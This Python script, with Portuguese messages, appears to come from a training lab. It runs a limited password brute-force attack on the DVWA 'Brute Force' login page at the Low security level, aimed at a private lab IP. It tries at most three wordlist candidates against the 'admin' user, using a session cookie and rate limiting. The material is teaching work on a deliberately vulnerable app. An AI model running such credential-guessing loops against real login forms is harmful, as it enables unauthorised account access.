#!/usr/bin/env python3
"""Reprodução limitada do DVWA Low; somente biblioteca padrão.

Arquivo reconstituído a partir do procedimento documentado. Não é uma cópia
binária do script da execução histórica; veja README e relatório.
"""

import getpass
import re
import sys
import time
from html.parser import HTMLParser
from pathlib import Path
from urllib.error import HTTPError, URLError
from urllib.parse import urlencode
from urllib.request import HTTPRedirectHandler, ProxyHandler, Request, build_opener

TARGET = "http://192.168.56.103/dvwa/vulnerabilities/brute/"
WORDLIST = Path(__file__).resolve().parents[1] / "wordlists" / "senhas-dvwa.txt"
MAX_RESPONSE = 2 * 1024 * 1024


class Inconclusive(Exception):
    """O teste não permite concluir se a credencial foi aceita."""


class NoRedirect(HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


class Page(HTMLParser):
    def __init__(self, html):
        super().__init__(convert_charrefs=True)
        self.parts = []
        self.inputs = set()
        self.feed(html)
        self.text = " ".join(" ".join(self.parts).split())

    def handle_data(self, data):
        self.parts.append(data)

    def handle_starttag(self, tag, attrs):
        if tag.lower() == "input":
            name = dict(attrs).get("name")
            if name:
                self.inputs.add(name.lower())


def validate_cookie(cookie):
    if not re.fullmatch(r"[A-Za-z0-9,-]{16,128}", cookie):
        raise Inconclusive("Copie somente o valor de PHPSESSID.")
    return cookie


def load_candidates(path, limit=3):
    try:
        if path.stat().st_size > 8192:
            raise Inconclusive("Lista maior que o limite do exercício.")
        values = path.read_text(encoding="utf-8").splitlines()
    except (OSError, UnicodeError):
        raise Inconclusive("Não foi possível ler a lista UTF-8.") from None
    if not 1 <= len(values) <= limit:
        raise Inconclusive(f"Use de 1 a {limit} candidatas.")
    if any(not value or len(value) > 256 for value in values):
        raise Inconclusive("A lista contém uma entrada vazia ou longa demais.")
    return values


def check_page(html):
    page = Page(html)
    if not re.search(r"Security Level\s*:\s*low\b", page.text, flags=re.I):
        raise Inconclusive("Página inesperada: confirme a sessão e o nível Low.")
    if not {"username", "password"}.issubset(page.inputs):
        raise Inconclusive("Formulário Brute Force não identificado.")
    if any("token" in name or "csrf" in name for name in page.inputs):
        raise Inconclusive("Formulário com token inesperado; confira a versão e o nível.")
    return page.text


def classify(html, username):
    text = check_page(html)
    success = bool(re.search(
        r"Welcome to the password protected area\s+" + re.escape(username)
        + r"(?![\w.-])", text
    ))
    failure = "Username and/or password incorrect." in text
    if success == failure:
        raise Inconclusive("Resposta ambígua ou sem marcador conhecido.")
    return "SUCESSO" if success else "FALHA"


def fetch(opener, url, cookie, timeout=10):
    request = Request(url, headers={
        "Cookie": f"PHPSESSID={cookie}; security=low",
        "Accept": "text/html",
        "User-Agent": "DIO-DVWA-Lab/1.0",
    })
    try:
        with opener.open(request, timeout=timeout) as response:
            if response.status != 200 or response.geturl() != url:
                raise Inconclusive("Resposta HTTP inesperada ou redirecionamento.")
            if response.headers.get_content_type() != "text/html":
                raise Inconclusive("A resposta não é HTML.")
            data = response.read(MAX_RESPONSE + 1)
            if len(data) > MAX_RESPONSE:
                raise Inconclusive("Resposta maior que o limite do exercício.")
            return data.decode("utf-8", errors="replace")
    except HTTPError as exc:
        if 300 <= exc.code < 400:
            raise Inconclusive("Redirecionamento recusado; confira a sessão.") from None
        raise Inconclusive(f"Erro HTTP {exc.code}; tentativa não classificada.") from None
    except (URLError, OSError):
        raise Inconclusive("Falha de conexão; tentativa não classificada.") from None


def run(target, username, candidates, cookie, *, limit=3, delay=1, timeout=10):
    validate_cookie(cookie)
    if not 1 <= len(candidates) <= limit:
        raise Inconclusive(f"Use de 1 a {limit} candidatas.")
    if delay < 1 or not 0 < timeout <= 30:
        raise Inconclusive("Use intervalo de pelo menos 1 s e timeout de até 30 s.")
    opener = build_opener(ProxyHandler({}), NoRedirect())
    check_page(fetch(opener, target, cookie, timeout))
    print(f"Alvo: {target}")
    print(f"Usuario: {username}; candidatas: {len(candidates)}")
    for position, candidate in enumerate(candidates, start=1):
        if position > 1:
            time.sleep(delay)
        query = urlencode({"username": username, "password": candidate, "Login": "Login"})
        result = classify(fetch(opener, target + "?" + query, cookie, timeout), username)
        print(f"Tentativa {position}: {result}")
        if result == "SUCESSO":
            print(f"Senha da linha {position} aceita pelo modulo.")
            return 0
    print("Nenhuma candidata aceita nesta lista.")
    return 1


def main():
    try:
        cookie = validate_cookie(getpass.getpass("Valor de PHPSESSID (oculto): "))
        candidates = load_candidates(WORDLIST, limit=3)
        return run(TARGET, "admin", candidates, cookie)
    except Inconclusive as exc:
        print(f"INCONCLUSIVO: {exc}")
        return 2
    except (EOFError, KeyboardInterrupt):
        print("\nInterrompido.")
        return 130


if __name__ == "__main__":
    sys.exit(main())
